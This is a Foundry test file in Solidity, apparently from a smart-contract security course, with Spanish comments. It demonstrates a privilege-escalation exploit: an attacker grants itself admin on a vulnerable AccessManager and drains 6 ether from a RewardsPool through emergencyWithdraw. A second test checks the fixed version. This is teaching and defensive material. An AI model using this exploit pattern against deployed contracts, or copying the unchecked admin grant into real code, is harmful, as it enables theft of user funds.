// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {AccessManager} from "../../src/access-control/target/AccessManager.sol";
import {RewardsPool} from "../../src/access-control/target/RewardsPool.sol";
import {AccessManagerFixed} from "../../src/access-control/mitigations/AccessManagerFixed.sol";

contract AccessControl04Test is Test {
    AccessManager access;
    RewardsPool pool;

    AccessManagerFixed accessFixed;
    RewardsPool poolFixed;

    address legitUser = makeAddr("legitUser");
    address attacker = makeAddr("attacker");

    function setUp() public {
        access = new AccessManager();
        pool = new RewardsPool(address(access));

        accessFixed = new AccessManagerFixed();
        poolFixed = new RewardsPool(address(accessFixed));

        vm.deal(legitUser, 6 ether);
        vm.prank(legitUser);
        pool.deposit{value: 6 ether}();

        vm.deal(legitUser, 6 ether);
        vm.prank(legitUser);
        poolFixed.deposit{value: 6 ether}();
    }

    /// @dev No hace falta ningun contrato atacante: grantAdmin() no comprueba
    ///      nada, asi que el atacante se autoconcede el rol en AccessManager y
    ///      lo explota directamente en un contrato completamente distinto
    ///      (RewardsPool) que confia ciegamente en el.
    function test_exploit_privilegeEscalation() public {
        uint256 stolen = address(pool).balance;
        assertEq(stolen, 6 ether);

        vm.startPrank(attacker);
        access.grantAdmin(attacker);
        pool.emergencyWithdraw(payable(attacker));
        vm.stopPrank();

        assertEq(attacker.balance, stolen);
    }

    function test_mitigation_blocksPrivilegeEscalation() public {
        vm.startPrank(attacker);
        vm.expectRevert(bytes("Not admin"));
        accessFixed.grantAdmin(attacker);
        vm.stopPrank();

        assertFalse(accessFixed.isAdmin(attacker));
        assertEq(address(poolFixed).balance, 6 ether, "el balance no debe moverse");
    }
}
